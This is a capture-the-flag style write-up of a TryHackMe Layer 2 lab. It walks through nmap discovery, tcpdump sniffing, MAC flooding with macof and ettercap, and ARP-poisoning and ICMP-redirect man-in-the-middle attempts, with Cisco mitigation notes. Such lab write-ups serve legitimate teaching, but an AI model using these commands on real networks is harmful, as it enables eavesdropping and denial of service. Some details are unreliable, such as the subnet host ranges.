
# Fz3r0 Operations  [Network Security (NetSec)]

![My Video](https://user-images.githubusercontent.com/94720207/165892585-b830998d-d7c5-43b4-a3ad-f71a07b9077e.gif)

### Try Hack Me - Layer 2 MAC Flooding & ARP Spoofing - Writeup by [Fz3r0 💀](https://github.com/Fz3r0/)

- Link: https://tryhackme.com/room/layer2

---

##### Twitter  : [@fz3r0_OPs](https://twitter.com/Fz3r0_OPs) 
##### Github  : [Fz3r0](https://github.com/fz3r0) 

---
 
#### Keywords: `Networking` `Routing & Switching` `CCNA` `CCNP` `Layer 2 Attack` `Hacking` `Pentesting` `MAC Flooding` `ARP Spoofing` `Try Hack Me` `Writeup`
---
   
### Index 

- < **[Before anything else!!!](/Networking/Attacking-Cisco/THM-L2-MAC-Flooding-&-ARP-Spoofing-writeup.md#layer-2-mac-flooding--arp-spoofing)** >

- < **Task 1**: [Network Discovery](/Networking/Attacking-Cisco/THM-L2-MAC-Flooding-&-ARP-Spoofing-writeup.md#network-discovery) >

- < **Task 2**: [Passive Network Sniffing](/Networking/Attacking-Cisco/THM-L2-MAC-Flooding-&-ARP-Spoofing-writeup.md#passive-network-sniffing) >

- < **Task 3**: [Sniffing while MAC Flooding](/Networking/Attacking-Cisco/THM-L2-MAC-Flooding-&-ARP-Spoofing-writeup.md#sniffing-while-mac-flooding) >

    - < **Task 3.1**: [Mitigation of MAC Flooding Attacks on Cisco Layer 2 Devices](/Networking/Attacking-Cisco/THM-L2-MAC-Flooding-&-ARP-Spoofing-writeup.md#mitigation-of-mac-flooding-attacks-on-cisco-layer-2-devices) >

- < **Task 4**: [MITM Man-in-the-Middle (MITM): Intro to ARP Poisoning + Sniffing](/Networking/Attacking-Cisco/THM-L2-MAC-Flooding-&-ARP-Spoofing-writeup.md#man-in-the-middle-intro-to-arp-spoofing) >

- < **Task 5**: [MITM Man-in-the-Middle (MITM): ARP Posoning + MAC Spoofing + Sniffing || Reverse Shell Payload + PrivEsc](/Networking/Attacking-Cisco/THM-L2-MAC-Flooding-&-ARP-Spoofing-writeup.md#man-in-the-middle-sniffing) >

    - < **Task 5.1**: [Mitigation of ARP Poisoning + MAC Spoofing Attacks on Cisco Layer 2 Devices]() >

- [< **Conclusions & Proof of Concept** >](/Networking/Attacking-Cisco/THM-L2-MAC-Flooding-&-ARP-Spoofing-writeup.md#layer-2-mac-flooding--arp-spoofing)

---

### Layer 2 MAC Flooding & ARP Spoofing

- **Before anything else!**
    
    - First of all, I want to thank the creator of this Cyber-Security laboratory focused on Layer 2 Network Security. I really enjoyed experimenting and learning with it! I'm looking forward to the next labs that will be released!
    
    - The machine is hosted on Try Hack Me and you can try it -here- (using this write up of course!) 

&nbsp;

<span align="center"> <p align="center"> ![3456b9bc-c5b2-4b16-862f-adbf7480e47b](https://user-images.githubusercontent.com/94720207/167259274-fe141a10-7f9e-48d9-bd08-4f8f69aa6281.png) </p> </span>

&nbsp;

- **Scope**
    
    - This write up is mainly focused in 2 different types of attacks to the Layer 2 of the OSI Model: `MAC Flooding Attacks` & `ARP Posoning Attacks`, using secondary techniques like `sniffing`, `packet tampering`, `network mapping`, among others... to fulfill the main purpose of a hacker attack or penetration test in this scenario: the escalation to root privileges on a given host or server. 
    
    - At the moment I'm preparing for some Cisco certifications and I'm looking forward to gain more experience & knowledge for my Cisco career focused in Network & Infraestructure Security, so I will focus the Mitigation of the Layer 2 Attacks reviewed in this room mainly for secure & harden Cisco Infraescturcture like Cisco Layer 2 Switches Catalyst Series.
    
    - I've included some more Cisco References about Security and Best Practices for this write up, which I've included at the end of the document. 
    
    - I've also used the material reviewed during my courses at the Cisco Network Academy.     

&nbsp;

<span align="center"> <p align="center"> ![image](https://user-images.githubusercontent.com/94720207/167259452-b5d52098-9039-4ed9-8e71-c9292dda0d54.png) </p> </span>

&nbsp;

- **Author Introduction & Setup Instructions for the Lab**

    - For the sake of this room, let's assume the following:

        - While conducting a pentest, you have gained initial access to a network and escalated privileges to root on a Linux machine. 
        - During your routine OS enumeration, you realize it's a dual-homed host, meaning it is connected to two (or more) networks. 
        - Being the curious hacker you are, you decided to explore this network to see if you can move laterally.
        
        - After having established persistence, you can access the compromised host via SSH:
        
            - `ssh -o StrictHostKeyChecking=accept-new admin:Layer2@$ip_target`
            
        - Note: The admin user is in the sudo group. I suggest using the root user to complete this room: `sudo su -` 
        
- **Topology of the GNS3 Lab:**

<span align="center"> <p align="center"> ![image](https://user-images.githubusercontent.com/94720207/166299318-bd8ac75a-92b6-4847-a2f4-2433197606ab.png) </p> </span> 
        
- **Login & Root:**

![image](https://user-images.githubusercontent.com/94720207/166800191-fc9513dc-5d14-4e2e-b3ba-d09d3d46f41e.png)
![image](https://user-images.githubusercontent.com/94720207/166290085-b08e918d-f03a-4f26-99e4-a415b0e373c0.png)

- OK...let's keep going...

---

### Network Discovery

- As mentioned previously, the **host** `eve` is connected to **''one or more additional networks''**. 

- I'm are currently **connected to the machine `eve` via SSH on Ethernet adapter `eth0`**. 

- The network of interest is connected with Ethernet adapter `eth1`.

    -  **I will call the different Subnets/Networks as:**
    
        -  **Broadcast Domain 1 : `192.168.12.0/24`**
        -  **Broadcast Domain 2 : `10.x.x.0`**

- We have already managed to breach host `eve`, and I can "see" both `Broadcast Domains` from there. 

- I will scan the subnet 192.168.12.0/24 with `nmap` to search for some hosts/attack surfaces.

<span align="center"> <p align="center"> ![image](https://user-images.githubusercontent.com/94720207/167043123-7eacd1ed-a3cd-40b4-91f4-098ffb14593d.png) </p> </span>

1. First, have a look at the adapter:

    - `ip address show eth1` or the shorthand version: `ip a s eth1`

        - ![image](https://user-images.githubusercontent.com/94720207/166290765-190266f9-0234-40ae-ad23-2bab0a5af312.png)

2. Let's suppose that I don't know what's the LAN Topology, so I will scan the Network using NMap to discover more hosts.

    - First, I will use the IPv4 Address of the RHOST/Attacker **(The machine I'm already in! `eve`)** to check for more hosts in the Network who share the same **`Network ID`**.
     
    - The IP of out Host is using `CIDR /24` (255.255.255.0) `Class C` and is the typical "192.168.x.x", so it's very easy to figure out the Network ID and more details:
    
        - PWNED host: `192.168.12.66/24`
        
        - Network ID: `192.168.12.0`
        - SubnetMask: `255.255.255.0` 
        - CIDR      : `/24`
        - Min Host  : `192.168.0.1`
        - Max Host  : `192.168.0.254`
        - Broadcast : `192.168.0.255`
        - Wildcard  : `0.0.0.255`
        
    - Fire in the hole:      
    
        - `sudo nmap -PR -sn 192.168.12.0/24` 

            - ![image](https://user-images.githubusercontent.com/94720207/166302924-fffd0a0b-13a4-4bc1-b97c-62f315f941c8.png)

- There are a total of 3 hosts in the Network:

    1. alice (192.168.12.1) MAC Address: 00:50:79:66:68:00 (Private)
    2. bob (192.168.12.2) MAC Address: 00:50:79:66:68:01 (Private)
    3. eve (192.168.12.66) _We are in this machine_
 
- I will scan each host:

1. First, I will scan "myself" `eve` (the machine where I logon with ssh & "gained" root privileges, it's supposed that we already have compromised that machine... but I don't know where i'm steping up, so!)

    - `nmap -sV -sC -Pn -T4 -n -p- 192.168.12.66 -o 1___recon_nmap_ALLPORTS_LAYER2_attack.txt`

    - ![image](https://user-images.githubusercontent.com/94720207/166293441-32e43138-a1b4-41b3-9bd8-667747c6dbf8.png)

        - There are some open ports in `eve`: 
        
            - Those ports are actually a very beautiful & clever setup of a `GNS3` lab. Where different devices such as a `Layer 2 Switch` and some hosts are simulated and/or virtualized, so we can experiment with it.

            - _During the lab, the machine changes its setup and we must start a new virtual machine, which has the hosts configured differently._

            - I took the liberty of reviewing the Lab that the author has shared **(thank to you sir!)**, in this case a generic GNS3 Switch is being used (not an IOS image of a Cisco Switch for example).
        
            - The L2 Switch **DO NOT HAVE** any security configuration, it's just switching the LAN  
                
            - Anyway! I will scan now the other 2 Hosts I discovered: 

2. **Host: `alice` (192.168.12.1) MAC Address: 00:50:79:66:68:00** (Private)

    - `nmap -sV -sC -Pn -T4 -n -p- 192.168.12.1 -o 1___recon_nmap_ALLPORTS_LAYER2_attack.txt`

        - ![image](https://user-images.githubusercontent.com/94720207/166314063-f84ab825-a76f-4de8-acd6-95d2f79a5946.png)

3. **Host: `bob` (192.168.12.2) MAC Address: 00:50:79:66:68:01** (Private)

        - `nmap -sV -sC -Pn -T4 -n -p- 192.168.12.2 -o 1___recon_nmap_ALLPORTS_LAYER2_attack.txt`
    
    - ![image](https://user-images.githubusercontent.com/94720207/166314835-1c7304f1-b55c-4ed9-af1f-00cc98d2a0e4.png)

- I've tried different commands and flags for `nmap` to scan both hosts, but I found nothing.

    - However, **we know the design of the `physical and logical topology` of the Network, and we can try to `sniff` into the new `broadcast domain` that we have discovered.**

---

### Passive Network Sniffing

- Simply scanning those hosts won't help us gather any useful information, and you may be asking, what could a pentester do in this situation? 

- Depending on the rules of engagement and scope, you could try **`sniffing traffic on this network`**.

    - The diagram below describes our current situation where **we are the `Attacker` and have persistent access to `eve`**.

        - ![image](https://user-images.githubusercontent.com/94720207/166610614-eca095b9-24c8-4db6-b283-babd313eef87.png)

- As you can see, from `eve` we can _"see"_ 2 different `Broadcast Domains` for 2 different LANs/Subnets, 

### I've found in my old write ups of Networking something very useful for the next tasks and this room in general. It talks about Layer 2 types of comunication & how devices like Switches & Hubs at Layer 2 creates Broadcast and Collision Domains. Also, how Layer 2 devices uses MAC Addresses to identify who is every host within the LAN:

<span align="center"> <p align="center"> ![image](https://user-images.githubusercontent.com/94720207/166326956-69553eaf-4a36-4494-9f37-9e19753ed742.png) </p> </span>

<span align="center"> <p align="center"> ![image](https://user-images.githubusercontent.com/94720207/166402151-e29d22e6-c954-4e1d-a012-41c016e35b0c.png) </p> </span>
    
- Here's the deal! **We can _"hear"_ any `broadcast` sent _"inside"_ the network `192.168.12.0`, we also can _"hear"_ if someone is trying to connect with us `eve` with `unicast` traffic:** 

    - Imagine we are inside a "room", if someone **"scream"** **everyone inside the room will hear that person, including us. That's `broadcast` traffic.**
    
    - But! If 2 persons **"whisper"** together, even if we are in the same room we **CAN'T" hear them!. That's `unicast` traffic.**
    
        - For example, a `ping` is composed of 2 types of "messages":
        
            -  `ARP`: Broadcast
            -  `ICMP`: Unicast  
    
    - **At this point:**  
            
        - **We CAN'T hear if `bob` or `alice` are whispering together.**

        - **We CAN hear if `bob` or `alice` try to whisper with us `eve`**.
        
        - **We CAN hear if `bob` or `alice` scream to everyone.** 

- So, we will sniff on `eth1` as shown in the diagram:

    - ![image](https://user-images.githubusercontent.com/94720207/166613478-3f4fa9c2-044a-40ff-b4f0-a35de72ccbbc.png)

- Let's try running `tcpdump` on the `eth1` **network interface**:

    - `tcpdump -i eth1`
        
        - ![image](https://user-images.githubusercontent.com/94720207/166315229-f1f193e1-10d0-44a4-be99-074d354502cc.png) 

- Optionally, for a more verbose output that prints each packet (minus its link level header) in ASCII format:

    - `tcpdump -A -i eth1`

        - ![image](https://user-images.githubusercontent.com/94720207/167053431-859f9536-eb1f-4421-9de1-a171f602f404.png)

- Now, let's take a closer look at the captured packets! We can redirect them into a `PCAP` file providing a destination file via the `-w` argument.

- Capture traffic for about a minute, then transfer the `PCAP` to the Attacker Machine & open it in `Wireshark`:

    - `tcpdump -A -i eth1 -w /tmp/Fz3r0_NetSec_PCap1.pcap`

        - ![image](https://user-images.githubusercontent.com/94720207/166316424-4a33587f-97d7-45fa-8434-972f41085fa8.png)

- I will use `SCP` to transfer the file, but it could be done in many ways. _(mounting a python HTTP server is another easy way)_.
    
    - `scp admin@$ip_target:/tmp/Fz3r0_NetSec_PCap1.pcap .` 

        - ![image](https://user-images.githubusercontent.com/94720207/166317931-def6931f-c8b3-488e-8f8b-7031236c330e.png)

- `Wireshark` PCAP:

    - Note: If you receive an error _"tcpdump: /tmp/tcpdump.pcap: Permission denied"_ and cannot overwrite the existing /tmp/tcpdump.pcap file, specify a new filename such as `tcpdump2.pcap`, or run `rm -f /tmp/*.pcap` then re-run tcpdump. 

<span align="center"> <p align="center"> ![image](https://user-images.githubusercontent.com/94720207/166318386-720217fb-8bfc-4548-a5bb-1424e0c5409e.png) </p> </span>

- This is a very easy `PCAP` to read, I captured more than 1 minute and I got just 68 packets.

- Even without filters I can notice that there are only traffic betweet 2 hosts: `eve` (LHOST)>(192.168.12.66) `bob` (192.168.12.2)

- The type of packets sent are `ICMP`(**unicast**), that means `bob` is the `source` who is sending `Ping/ICMP` to us `eve`, we are the `destination`

- Then, `eve` send back `ICMP-ACKs` to respond those `ICMP`. 

<span align="center"> <p align="center"> ![image](https://user-images.githubusercontent.com/94720207/166323557-81003b11-b587-4267-b473-c1c2c906ff33.png) </p> </span>

- We can also analyze the data sent throught `ICMP`, this is a crafted `ICMP` with random characteres to fit X o Y size in bytes so we can experiment with that traffic, no useful information tho.

    - **At this point, we can't do very much with that intercepted packets, those are only ICMPs (ping) with random data "abcdefghij.... 

    - Anyways... I proved the point shown un the diagram:
    
        1. **I can "hear" if `bob` is sending to me (`eve`) unicast traffic: he is sending `ICMP Request`(**"Hello"**) and `eve` is replying with `ICMP Replies` (**"ACK"**)

        2. **We can't hear nothing from `alice`, she is NOT sending unicast traffic to us `eve` or broadcasts to the Network.
    
        3. **We can't "hear" if `alice` is sendig unicast traffic to `bob`**  (if they are whispering together)

- **It could be a way to "hear" the "whispering" between `bob` and `alice`???...**

- **Yes! of course there are some ways and different aproaches to achieve this _(unless the Network is configured properly with security protocols and best practices)_

    - All aboard ayeee!:
 
---

### Sniffing while MAC Flooding

- Unfortunately, we weren't able to capture any interesting traffic so far. However, we're not going to give up this easily! 

- So, how can we capture more network traffic? how we can "hear" those "whispering"(unicast traffic other hosts)? -

- **In this task I will start with `MAC flooding attack against the L2-Switch`**.

    - **Beware:** 
    
        - **MAC flooding could trigger an alarm in a SOC. No, seriously, suspicious `Layer 2 traffic` can easily be detected and reported by state-of-the-art and properly configured network devices.** 
        
        - Even worse, **your network `port` could even get blocked by the network device altogether, rendering your machine locked out of the network**. 
    
        - In case of production services running on or production traffic being routed through that network connection, **this could even result in an effective Denial-of-Service!**

        - ![image](https://user-images.githubusercontent.com/94720207/166886881-7bdfda21-5c57-4592-9a28-438e5e5441fc.png)

- However, if we're successful, the **`switch` will resort to fail-open mode and temporarily operate similarly to a network `hub` _(Remember those collisions & broadcast domains?)_**. 

- If the `switch` start operating like a `hub`, **it will forward all received frames to every connected port (aside from the port the traffic originated from)**. 

    - This would allow a "third person" (`eve`) to `sniff` the **network traffic between other hosts **(`alice` >> << `bob`)**
     
    - That traffic normally wouldn't be received by the "third person" `eve` if the switch were functioning properly.
   
    - That means, `eve` could be able to `sniff` `unicast traffic` between `bob` and `alice`.
     
    - Just like if the network were using a `hub` instead of a `switch` (using the same `collision domain` and `broadcast domain`). 
    
    - **Actually, all the traffic in the subnet could be heard from any Eth Port by anyone during the attack.** 

- This means 

    - **Considering such an attack vector is only recommended when you have reasons to believe that:**

        1. It is in fact a **switched network** (and not a virtual bridge) AND
        
        2. The `switch` might be a consumer or prosumer (**unmanaged** switches: better known as "cheap shitty switch-hubs") switch OR:
            
        3. **The network admins haven't configured mitigations such as `Dynamic ARP Inspection (DAI)` for instance AND `ARP` and `MAC spoofing` attacks are explicitly permitted in the rules of engagement. And expensive and Pro switches even like Cisco Catalyst could be breached!**
            
            - **I'm making a guide to achieve Best Practices & Security to Cisco Layer 2 devices [here]**(https://github.com/Fz3r0/Fz3r0#-networking--1) _(I still need to update the info)_

- _- "Anyhow, let's assume you've met the well-thought decision to give it a try."_

    - For better usability, open a second SSH session. This way, you can leave the tcpdump process running in the foreground: 
        
        - ![image](https://user-images.githubusercontent.com/94720207/166393591-bb42bbb8-d3c7-4a31-8e05-719c733183d5.png)

    1. On the `First SSH session` (Top Screen) I will run `tcpdump` so I can **capture all the packets during the Attack.** 
        
        - `tcpdump -A -i eth1 -w /tmp/tcpdump2.pcap` 
 
    2. On the `Second SSH session` (Bottom Screen) I will run `macof` to launch a `Mac Flooding Attack` against the `Switch` (**CAM Table**). 

        - `macof -i eth1`
    
            - After around 30 seconds, stop both `macof` and `tcpdump` `(Ctrl+C)`. 

        - ![image](https://user-images.githubusercontent.com/94720207/166393923-496a224b-2c4d-4557-b3f8-dfd34ae47489.png)

        - ![image](https://user-images.githubusercontent.com/94720207/166394716-9f12b0d8-f06f-4c92-9a9b-afa4ea454ab8.png)

    3. As in the previous task, transfer the pcap to your machine _(kali/AttackBox)_ and take a look.

        - `scp admin@$ip_target:/tmp/tcpdump2.pcap .` 

            - ![image](https://user-images.githubusercontent.com/94720207/166394524-aa7e5cad-0ff3-449b-84e1-7e4e5b27d42b.png)

- Note: If it didn't work, try to capture for 30 seconds, again while `macof` is running.

- If it still won't work, give it one last try with a capture duration of one minute.
    
    - As the measure of last resort, try using ettercap (introduced in the following tasks) with the `rand_flood` plugin:

        - `ettercap -T -i eth1 -P rand_flood -q -w /tmp/tcpdump3.pcap` _(Quit with q)_

            -  ![image](https://user-images.githubusercontent.com/94720207/166396579-a7ff04b2-0236-4eea-9447-767089ab5602.png)
            
- The trick of the attack is **start and end both commands at same time**, because `macof` will spam MACs and we need to capture all that "crazy traffic", so we can try to crash that `CAM Table` of the `switch` and make it show us all his traffic, , **`just like a hub would do`**. So just try to capture at same time!. 

    - You can send the file with `SCP` again to the attacker machine to analize the PCAP with `Wireshark`.
    
- **Full MAC Flooding Attack:**  

<span align="center"> <p align="center"> ![image](/Networking/Attacking-Cisco/MAC_Flooding_Attack.gif) </p> </span>

- To be clear what is just happened, I will compare without filters the PCAPs during a MAC Flooding Attack VS normal LAN scenario:

    - On a normal scenario I would only capture few packets **`(I've captured 8 packets in 15 seconds)`**, the pings that **`bob (192.168.12.2)`** is sending to me **`eve (192.168.12.66)`**, remember? he is the only one whispering to me in this Lab, so...I captured 8 ICMP pings from `bob` to me `eve`.  
    
    - But! during a MAC Flooding Attack, I will see thousands of "random" `IPv4 packets` with "random" `MAC Address` & `IPv4` caused by my attack...
    
        - ![image](https://user-images.githubusercontent.com/94720207/167235738-30f60ea2-bfb9-4b9b-8853-c06c18521ee6.png)
    
    - Hidding somewhere between that "noise" and "randomness" there are the `ICMP unicast traffic`:
    
        1. ICMP unicast "whispers" between me `eve 192.168.12.66` & `bob 192.168.12.2` **(Normal behavior)**  
          
        3. ICMP unicast "whispers" between `alice 192.168.12.1` & `bob 192.168.12.2`!!! **It means I can hear them!!!!** **(MAC Flooding Attack)**

- Let's analize another `PCAP` during a M`AC Flooding Attack`, **this time I captured more than 45 seconds of attack**:

    - This PCAP is HUUUUGE! it collected more than **half million packets** in less than one minute...
        
        - Remember, **on a "normal scenario" I collected only 10 packets in 15 seconds!! Now I collected more than half million in 45 secs!!!**
    
        - **That's why this is considered a very noisy attack! that could even provoque a `DoS`.**
        
    - Anyway...I will use the next `Wireshark filter` to search inside that noise for the IPs that I want (`alice` & `bob`):
    
        - `ip.addr == 192.168.12.1 || ip.addr == 192.168.12.2`
  
    - I'm filtering only the traffic containing IPs from `bob` (192.168.12.2) and `alice` (192.168.12.1). So maybe, I can find a "conversation" between both of them:
     
<span align="center"> <p align="center"> ![image](https://user-images.githubusercontent.com/94720207/167195198-5ad07f6f-bae9-4089-a9de-62735ae53d08.png) </p> </span>

- Another very good filter to prove the point is the next command I made, I will break it up:

    - `((ip.dst == 192.168.12.2) && (ip.src == 192.168.12.1)) && (ip.proto == 1)`
    
        - `(ip.dst == 192.168.12.2)` = Filter IPv4 from `bob` as `Destiny` 
        - `(ip.src == 192.168.12.1)` = Filter IPv4 from `alice` as `Source`
        - `&&` and `()` = group `bob` & `alice` so there will me shown only results that have that rule
        - `&& (ip.proto == 1)` = Filter only `ICMP` packets

    - Then, with that filter I will only see `ICMP unicast traffic` sent **from** `SRC: alice` **to** `DST: bob` (Their "whispers"!)

<span align="center"> <p align="center"> ![image](https://user-images.githubusercontent.com/94720207/167070863-837ec492-31d6-4fa8-955f-c12bccc18fdf.png) </p> </span>

- With that filter I also can compare & analyze 2 different PCAPs I captured, one during a `MAC Flooding Attack`, other on a "normal" scenario:

<span align="center"> <p align="center"> ![image](https://user-images.githubusercontent.com/94720207/167184382-e1585496-d7df-48f5-8197-020400077fcb.png)</p> </span>
        
- I've found them! Analyzing the half million packets I've found 57 unicast packets between `bob` & `alice`, _I can read their minds..._

- Now, I can read all the "conversation" between `alice` & `bob`, in this case those are only `ICMP Request` & `ICMP Replies` between them, but it proves: 

    - **`MAC Flooding Attacks` could provoque that `unicast` traffic like `ICMP` between other hosts in the network (`alice` & `bob`) can be "visible" for other hosts in the Network (`eve`).** 
    
    - **This is performed `sniffing` the traffic while performing the `MAC Flooding`. It means:**

        - **I've "heard" the "whispering" (`unicast`) betweeen `bob` and `alice` inside the "room" (`Network,Subnet,LAN,VLAN...`).**

- Just for a better idea this is somehow what it just happened:

    - Normal Switch & LAN behaviour & traffic between `bob` & `alice`:

        - ![image](https://user-images.githubusercontent.com/94720207/166591522-1e1a8ac6-c570-4d2f-8097-dc4d8e28a07d.png)

    - `Switch` crash and faulty behaviour during a `MAC Flooding Attack`:

        - ![image](https://user-images.githubusercontent.com/94720207/166606307-bc4066c9-926a-4d79-be2c-f0a8b6c40e8c.png)

- I've just made the `switch` "go crazy" and start working as a `hub` due to overwhelming spam of MAC Addresses inside the `CAM Table` of the `switch`, then I captured the traffic to "see" the conversation between `alice` and `bob`, [remember the broadcast & collision domains?](/Networking/Attacking-Cisco/THM-L2-MAC-Flooding-&-ARP-Spoofing-writeup.md#ive-found-in-my-old-write-ups-of-networking-something-very-useful-for-the-next-tasks-and-this-room-in-general-it-talks-about-layer-2-types-of-comunication-and-how-devices-like-switches-and-hubs-at-layer-2-creates-broadcast-and-collision-domains-also-how-layer-2-devices-uses-mac-addresses-to-identify-who-is-every-host-inside-the-lan)

### Mitigation of MAC Flooding Attacks on Cisco Layer 2 Devices

- **Mitigation** Configuring `Dynamic ARP Inspection (DAI)` on our Layer 2 Devices, for example Cisco Switches.**
    - ** Port Security is also another option configuring out switchport to only hold a max of 10 MAC on the CAM table**
    - Note: **THAT'S WHY WE NEED TO CONFIGURE `DYNAMIC ARP INSPECTION (DAI)` IN OUR `CISCO SWITCHES`, JUST AS WE SAW IN CISCO CCNAV7 MODULE-2 SECURITY "LAYER 2 ATTACKS"**
    - We can also use more defensive techniques but in this case I'm just remarking the configs of best practices and security on our Layer 2 Devices.

--- 

### Man-in-the-Middle: Intro to ARP Spoofing

- As you may have noticed, `MAC Flooding` can be considered a real "noisy" technique _**(making the switch go crazy and doing a "DoS like" attack is not so ninja)**_. 

- In order to reduce the risk of detection and `DoS` we will leave `macof` aside for now. 

- Instead, we are going to perform so-called `ARP cache poisoning` attacks against `Alice` and `Bob`, in an attempt to become a **fully-fledged `Man-in-the-Middle (MITM)**`.

- For a deeper understanding of this technique, [read the Wikipedia article on ARP spoofing](https://en.wikipedia.org/wiki/ARP_spoofing)

    – _"an attacker sends (spoofed) ARP messages […] to associate the attacker's MAC address with the IP address of another host […] causing any traffic meant for that IP address to be sent to the attacker instead. ARP spoofing may allow an attacker to intercept data frames on a network, modify the traffic, or stop all traffic. Often the attack is used as an opening for other attacks, such as denial of service, man in the middle, or session hijacking attacks." - Wikipedia - ARP spoofing_

![image](https://user-images.githubusercontent.com/94720207/166403377-49c6012d-6689-4763-8419-cfdd08a86387.png)
_https://commons.wikimedia.org/wiki/File:ARP_Spfing.svg_

- There are, however, measures and controls available to detect and prevent such attacks. 
    
    - **For example, `Cisco Layer 2 Devices` can be configured with `ARP Snooping`.

- In the current scenario, both hosts are running an `ARP` implementation that takes pains to validate incoming `ARP` replies. Without further ado, we are using `ettercap` to launch an `ARP Spoofing attack` against `alice` and `bob` and see how they react:

    - `ettercap -T -i eth1 -M arp` 

        - ![image](https://user-images.githubusercontent.com/94720207/166403965-3e7f755f-748b-4d58-b047-aa658fbf2f6f.png)

        - ![image](https://user-images.githubusercontent.com/94720207/166404207-8e0943c2-d525-4be7-b8b2-edfd0c94a2ab.png)

- Just to dig a little bit more about this command and cyber-weaponry... let's try another MITM attack instead of `ARP poisoning`...hmm how about `ICMP redirection` attack? 

    - https://www.mankier.com/8/ettercap#Examples
    
```

-M, --mitm <METHOD:ARGS>

MITM attack

This option will activate the man in the middle attack. The mitm attack is totally independent from the sniffing. The aim of the attack is to hijack packets and redirect them to ettercap. The sniffing engine will forward them if necessary.
You can choose the mitm attack that you prefer and also combine some of them to perform different attacks at the same time.
If a mitm method requires some parameters you can specify them after the colon. (e.g.  -M dhcp:ip_pool,netmask,etc )

The following mitm attacks are available:

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

arp ([remote],[oneway])

This method implements the ARP poisoning mitm attack. ARP requests/replies are sent to the victims to poison their ARP cache. Once the cache has been poisoned the victims will send all packets to the attacker which, in turn, can modify and forward them to the real destination.

Example:

the targets are: /10.0.0.1-5/ /10.0.0.15-20/
and the host list is: 10.0.0.1 10.0.0.3 10.0.0.16 10.0.0.18

the associations between the victims will be:
1 and 16, 1 and 18, 3 and 16, 3 and 18

if the targets overlap each other, the association with identical ip address will be skipped.

NOTE: if you manage to poison a client, you have to set correct routing table in the kernel specifying the GW. If your routing table is incorrect, the poisoned clients will not be able to navigate the Internet.

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

icmp (MAC/IP)

This attack implements ICMP redirection. It sends a spoofed icmp redirect message to the hosts in the lan pretending to be a better route for internet. All connections to internet will be redirected to the attacker which, in turn, will forward them to the real gateway. The resulting attack is a HALF-DUPLEX mitm. Only the client is redirected, since the gateway will not accept redirect messages for a directly connected network. BE SURE TO NOT USE FILTERS THAT MODIFY THE PAYLOAD LENGTH. you can use a filter to modify packets, but the length must be the same since the tcp sequences cannot be updated in both ways.
You have to pass as argument the MAC and the IP address of the real gateway for the lan.
Obviously you have to be able to sniff all the traffic. If you are on a switch you have to use a different mitm attack such as arp poisoning.

NOTE: to restrict the redirection to a given target, specify it as a TARGET

Example:

-M icmp:00:11:22:33:44:55/10.0.0.1

will redirect all the connections that pass thru that gateway.

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

dhcp (ip_pool/netmask/dns)

This attack implements DHCP spoofing. It pretends to be a DHCP server and tries to win the race condition with the real one to force the client to accept the attacker's reply. This way ettercap is able to manipulate the GW parameter and hijack all the outgoing traffic generated by the clients.
The resulting attack is a HALF-DUPLEX mitm. So be sure to use appropriate filters (see above in the ICMP section).

Example:

-M dhcp:192.168.0.30,35,50-60/255.255.255.0/192.168.0.1
reply to DHCP offer and request.

-M dhcp:/255.255.255.0/192.168.0.1
reply only to DHCP request.

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

port ([remote],[tree])

This attack implements Port Stealing. This technique is useful to sniff in a switched environment when ARP poisoning is not effective (for example where static mapped ARPs are used).

Example:

The targets are: /10.0.0.1/ /10.0.0.15/
You will intercept and visualize traffic between 10.0.0.1 and 10.0.0.15, but you will receive all the traffic for 10.0.0.1 and 10.0.0.15 too.

The target is: /10.0.0.1/
You will intercept and visualize all the traffic for 10.0.0.1.

```

- Since we already have the IPs and MACs from `bob`, `alice` & `eve` we can try to perform an `ICMP Redirection MITM attack`:

![image](https://user-images.githubusercontent.com/94720207/166405349-c5ff93b3-ea39-43e6-af4d-730ea9353b78.png)

- Ethernet II Frame:

    - Src: `alice` MAC: `00:50:79:66:68:00` IP: `192.168.12.1`
    - Dst: `bob` MAC: `00:50:79:66:68:01` IP: `192.168.12.2`

- `ettercap` command:
    
    - Example: `icmp (MAC/IP)`
    
        - `ettercap -T -i eth1 -M icmp:00:50:79:66:68:00/192.168.12.1` 

            - ![image](https://user-images.githubusercontent.com/94720207/166406256-b44e94e5-6e13-4c66-a901-33d32a91311b.png)

- **I couldn't find anything interesting here, but at least we have noticed a different behaivor betweeen `ARP poisoning`, `ICMP redirection` or other MITM attacks that we can perform with `ettercap`**

---

### Man-in-the-Middle: Sniffing

- _We have just started another VM, so I refreshed the variable $ip_target & also hosts `bob` & `alice` chianged their IPs & traffic inside the Network._

- In this somewhat altered scenario, `alice` and `bob` are **running a different OS (Ubuntu) with its default ARP implementation and no protective controls on their machines.** 

- As in the previous task, **we need to try to establish a `MITM` using `ettercap` and see if Ubuntu (by default) is falling prey to it.**

    - OK, let's start from the beginning again:

1. **Network Discovery:**

    - Just as we did on Discovery phase on the other machine, first I'll look to my interfaces and IP configuration:

        - ![image](https://user-images.githubusercontent.com/94720207/166412391-3dae2d9b-48b8-4c9b-9331-f7f15b8875d7.png)

    - It looks a little bit different from the first scenario, that's because the lab changed a little bit, but we still with the same broadcast domains, and we still on network `192.168.12.66/24`
    
    - Physical Topology remains the same.  

        - ![image](https://user-images.githubusercontent.com/94720207/166412853-a5e079f8-d64f-4025-b628-f7dc137dbba8.png)

- We have again 3 hosts _(in this case with different IPs)_

    1. alice (192.168.12.10) MAC Address: FE:C2:FD:1A:B0:54 (Unknown)
    2. bob (192.168.12.20) MAC Address: F2:28:1A:40:F1:56 (Private)
    3. eve (192.168.12.66) _We are in this machine_

2. **Hosts enum**

    - I will scan `alice` & `bob`:

